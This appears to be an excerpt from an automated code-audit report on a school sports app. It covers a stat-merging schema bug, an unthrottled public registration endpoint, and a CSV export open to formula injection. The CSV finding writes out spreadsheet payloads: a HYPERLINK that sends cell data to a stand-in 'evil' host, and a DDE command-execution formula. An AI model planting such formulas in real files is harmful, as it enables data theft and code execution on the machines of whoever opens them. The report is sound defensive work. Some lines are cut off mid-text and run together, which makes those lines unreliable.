### 2. [P1] PlayerSeasonStat unique key omits `sport` → a multi-sport athlete's identical stat codes (AST/PTS/G/A/BLK/TD/HR…) merge into one row, corrupting per-sport leaderboards and the record book

- **File:** `packages/database/prisma/schema.prisma:2558`
- **Class:** schema-vs-code uniqueness drift (dedup/upsert doubles/merges)
- **Confirm votes:** 2/2

**Failure scenario:** A `SportsPerson` is one persistent athlete identity per tenant, linked from `RosterPlayer.personId` across ANY sport. `PlayerSeasonStat` is keyed `@@unique([personId, season, statKey], name: "person_season_stat")` — it does NOT include `sport`. `deriveSeason()` (sports-stats.service.ts:456) derives the season string purely from the game date, so it is identical across sports. Many `PLAYER_STATS` (packages/api-types/src/sports.ts:1332) codes collide across sports: `AST` (basketball, volleyball, hockey), `PTS` (basketball, hockey, track, gymnastics, cheer…), `G`/`A` (soccer, hockey, lacrosse, field_hockey, water_polo), `BLK` (basketball, volleyball), `TD` (football, wrestling), `HR`/`RBI`/`AVG` (baseball, softball). Repro: athlete Jane (one linked personId) plays BOTH basketball and volleyball in season 2025-26. Basketball game finalizes → `playerSeasonStat.upsert({ where:{ person_season_stat:{ personId, season:'2025-26', statKey:'AST' }}, create:{ sport:'basketball', statValue:8 }})` creates the row. Volleyball game finalizes → the `findUnique`/`upsert` on the SAME key (sports-stats.service.ts:701-733) FINDS the basketball row and ADDS volleyball assists (e.g. +30) → statValue=38, `sport` stays 'basketball'. The basketball leaderboard index `[tenantId, sport, season, statKey, statValue Desc]` now shows a fabricated 38 assists; the volleyball assist leaderboard shows Jane with 0 (no volleyball 'AST' row exists). The career recompute (`findMany({ where:{ personId, statKey } })`, line 738) also omits `sport`, so `PlayerCareerStat` and any StatRecord/milestone derived from it are polluted the same way.

**Code evidence:** schema.prisma:2558  `@@unique([personId, season, statKey], name: "person_season_stat")`  — no `sport`.
sports-stats.service.ts:701  `where: { person_season_stat: { personId, season, statKey } }` (findUnique)
sports-stats.service.ts:711  `where: { person_season_stat: { personId, season, statKey } }, ... create: { sport, ... }` (upsert — `sport` only in create, so a colliding second-sport finalize UPDATEs the first sport's row)
sports-stats.service.ts:738  `const seasonRows = await tx.playerSeasonStat.findMany({ where: { personId, statKey } })` — career sum also ignores `sport`.
sports.ts:1332 PLAYER_STATS shows AST/PTS/G/A/BLK/TD/HR shared across sports.

**Verifier 1:** Independently verified in real code. schema.prisma:2559 `PlayerSeasonStat @@unique([personId, season, statKey], name: "person_season_stat")` omits `sport`, and schema.prisma:2582 `PlayerCareerStat @@unique([personId, statKey])` likewise omits it. In sports-stats.service.ts the finalize pass upserts the season row on `where: { person_season_stat: { personId, season, statKey } }` with `sport` present ONLY in `create` (lines 701-733), and recomputes the career row via `findMany({ where: { personId, statKey } })` (line 738) — both sport-blind. `deriveSeason` (line 456-474) is derived purely from the game date, so the season string is identical across a person's two sports. Colliding COUNTING stat codes across sports are confirmed in PLAYER_STATS (sports.ts:1332): AST (basketball+volleyball), BLK (basketball+volleyball), TD (football+wrestling), G/A (soccer+hockey+lacrosse+field_hockey+water_polo), PTS/HR/RBI etc. Given ONE `personId` linked to roster rows in two sports within the same season, the second sport's finalize UPDATEs the first sport's row (statValue += delta, `sport` unchanged), inflating one sport's leaderboard (which reads the `[tenantId, sport, season, statKey, statValue Desc]` index) and leaving the other sport's board empty; the career/StatRecord recompute is polluted identically. No guard anywhere in the path checks `sport`. One caveat that slightly narrows the trigger vs. the claim's framing: the auto-create dedup path (linkRosterPlayerToPerson Path 2, line 546-590) is scoped by `teamId`, and `Team` is sport-scoped (schema:2480), so the COMMON flow of building a basketball roster and a separate volleyball roster with team assignments yields two DIFFERENT personIds and does NOT collide. The collision requires the athlete to share ONE persistent identity across both sports — reachable via Path 1 (operator explicitly re-selects the same existing SportsPerson; Path 1 verifies only tenant, no sport check, lines 521-543) or via null-team linking (`(tenantId, null, normalizedKey)` matching one person). Both are legitimate, intended flows — the persistent-athlete model exists precisely to let one identity span games/seasons/sports — so the corruption is real and reproducible, just not on every game.

**Verifier 2:** The schema-drift is real and the corruption path exists in code — but the claim overstates its trigger, which lowers severity.

VERIFIED TRUE:
- schema.prisma:2559 — PlayerSeasonStat unique is @@unique([personId, season, statKey]); `sport` is NOT part of the key (only a plain column). PlayerCareerStat:2582 unique is [personId, statKey], also no sport.
- sports-stats.service.ts:701-733 — the season upsert keys on person_season_stat:{personId, season, statKey} with `sport` present ONLY in `create`. A second finalize on the same key therefore UPDATEs the existing row (ADDing the delta) and leaves the original `sport` untouched — exactly as claimed.
- line 738 — career recompute findMany({where:{personId, statKey}}) omits sport, so PlayerCareerStat sums across sports too.
- deriveSeason (456-474) is sport-independent (date-derived academic year), so the season string is identical across sports.
- Shared stat codes (AST/PTS/G/A/BLK/TD/HR) genuinely collide across sports (PLAYER_STATS).
- Leaders read (getStatLeaders, 796-886) DOES filter by sport, so a polluted basketball row surfaces on the basketball leaderboard and the volleyball 'AST' row never exists — the corruption manifests exactly as described.

WHERE THE CLAIM OVERSTATES:
The claim's headline repro ("Jane plays BOTH basketball and volleyball" → automatic merge) does NOT hold on the default/automated path. SportsPerson identity is TEAM-scoped (unique [tenantId, teamId, normalizedKey, gradYear], schema:2534) and every Team.sport is a required single-sport field (schema:2480). The name-based find-or-create (linkRosterPlayerToPerson Path 2, lines 565-590 — used by CSV import and autoLinkHomeRoster:1440) scopes to (tenantId, teamId), so the same athlete on a basketball team vs a volleyball team gets TWO DISTINCT personIds → two separate stat rows → NO collision. The single-personId-across-two-sports precondition is reachable ONLY via Path 1 (lines 521-544): an operator explicitly POSTing an existing athlete's personId (belonging to another sport's team) to /games/:id/roster/:rosterPlayerId/link. Path 1 verifies only tenant ownership — there is NO guard that the person's sport matches the game's sport — so the bug IS reachable, but it requires a deliberate, non-default manual cross-link, not the automatic multi-sport scenario the claim leads with.

Net: genuine unguarded schema-drift defect with real data-corruption consequences and no protection anywhere in the path — CONFIRMED — but triggered by an uncommon manual action rather than routine multi-sport play, so P2 not P1.


### 3. [P2] Unauthenticated /screens/register is @SkipThrottle() and creates an unbounded Screen DB row per unique fingerprint — no IP or global rate limit at all

- **File:** `apps/api/src/screens/screens.controller.ts:205`
- **Class:** rate-limit-bypass / unauthenticated resource-amplification (unbounded DB row creation)
- **Confirm votes:** 2/2

**Failure scenario:** An attacker scripts `POST /api/v1/screens/register` with a body carrying a fresh random `deviceFingerprint` on every request (no auth needed — the route is public). Because the method carries `@SkipThrottle()` (line 205), the NestJS Redis throttler — including the global 600/min-per-IP default in app.module.ts — never runs for this endpoint. The only in-process guard is `_registerFpCooldown` (line 126/143), a per-FINGERPRINT 5-second cooldown: since each request uses a brand-new fingerprint, `_registerFpCooldown.get(fpKey)` is always undefined and the cooldown never fires. Control falls to the 'New device' branch (line 463-511), which does a `screen.findUnique` on the generated pairing code (a DB read) and then unconditionally `prisma.client.screen.create(...)` — one new orphan Screen row per request, at whatever rate the pool/CPU allows. At, say, a few hundred req/s a single unauthenticated client can insert hundreds of thousands of orphan Screen rows per hour (each also minting a device JWT), bloating the `Screen` table, the pairing-code namespace, and the admin fleet views, with no per-IP or global ceiling. The code comment at lines 200-204 explicitly acknowledges 'an unauthenticated attacker spamming fingerprints can only create orphan Screen rows … cleanup script is a separate problem' — i.e. the creation itself is unmitigated. A per-IP `@Throttle` (the endpoint could keep a generous limit like 60-300/min/IP without re-introducing the 5/hr regression that originally motivated `@SkipThrottle()`) plus a per-IP unpaired-creation cap would close it.

**Code evidence:** @SkipThrottle()
@Post('register')
async register(@Body() body: {...}) { ... }
// per-FP cooldown only — a rotating/unique fingerprint never trips it:
const lastRegTs = _registerFpCooldown.get(fpKey); // always undefined for a fresh FP
...
// New device — create with pairing code. (runs every request for a new FP)
const screen = await this.prisma.client.screen.create({ data: { name: `Screen-${pairingCode}`, deviceFingerprint: body.deviceFingerprint, pairingCode, status: 'PENDING', ... } });

**Verifier 1:** The bug reproduces exactly from the real code. (1) `@SkipThrottle()` at screens.controller.ts:205 has no throttler name, so it skips ALL throttlers on the ThrottlerGuard — including the global default `{ttl:60000, limit:600}` registered via APP_GUARD in app.module.ts:186-190,247-248. There is no per-endpoint @Throttle on register (it was explicitly REMOVED in throttle-history "v5", lines 191-204). (2) The only in-process guard is the per-fingerprint cooldown (`_registerFpCooldown`, lines 253-259): for a fresh random deviceFingerprint, `_registerFpCooldown.get(fpKey)` returns undefined, so the `Date.now()-lastRegTs < REGISTER_FP_COOLDOWN_MS` check never fires. (3) The `existing = findUnique(deviceFingerprint)` (line 241) returns null for a new FP, so control falls to the 'New device' branch (line 463) which does a findUnique on the pairing code (DB read) then UNCONDITIONALLY runs `prisma.client.screen.create(...)` (lines 497-511) and mints a device JWT (line 518). No IP-based or global rate limit runs in this path. An unauthenticated attacker rotating fingerprints inserts one orphan Screen row per request at pool/CPU-bound rate, with no ceiling — a real resource-exhaustion/DB-bloat DoS. The code comment at lines 200-204 explicitly concedes the creation is unmitigated ('can only create orphan Screen rows … cleanup script is a separate problem').

**Verifier 2:** All claimed code paths verified in apps/api/src/screens/screens.controller.ts. ### 4. [P2] Sponsor proof-of-play CSV export has no formula-injection guard (operator-controlled sponsor name reaches an Excel-opened file handed to external sponsors)

- **File:** `apps/web/src/app/[schoolId]/sports/[gameId]/SponsorPanel.tsx:497`
- **Class:** CSV / formula injection
- **Confirm votes:** 2/2

**Failure scenario:** An operator creates a sponsor whose name is a spreadsheet formula, e.g. `=HYPERLINK("https://evil/x?d="&A1,"click")` or `=cmd|'/c calc'!A1` (DDE). Sponsor.name is stored server-side with only trim+truncate — sponsors.service.ts `clean()` (line ~172/204) does NOT strip a leading =,+,-,@, so the raw formula persists. In the browser the operator clicks 'Download CSV' in GameProofOfPlay (downloadCsv, line 525), which builds each row via `[s.name, ...].map(csvCell)` (line 530-531). `csvCell` (line 497-500) only quote-wraps cells containing `[",\n]` and does NOT prefix the dangerous formula-lead characters. The resulting proof-of-play-<id>.csv — a document specifically produced to hand to a sponsor's billing/AP contact at renewal — is opened in Excel/Numbers/LibreOffice/Google Sheets, which evaluate the leading-`=` cell as a formula: data exfiltration via =HYPERLINK/WEBSERVICE or, for DDE payloads on unpatched Excel, command execution. The codebase already ships the correct defense server-side (apps/api/src/audit/audit.controller.ts `csvEscape`, line 24-42, tab-prefixes any cell matching /^[=+\-@\t\r]/ and cites this exact OWASP CSV-injection risk for user-controlled audit-log strings), so this export is an inconsistent gap in the same defense class.

**Code evidence:** apps/web/src/app/[schoolId]/sports/[gameId]/SponsorPanel.tsx:497 — `function csvCell(v: string | number): string { const s = String(v ?? Contrast apps/api/src/audit/audit.controller.ts:37 — `if (/^[=+\-@\t\r]/.test(s)) { s = `\t${s}`; }`.
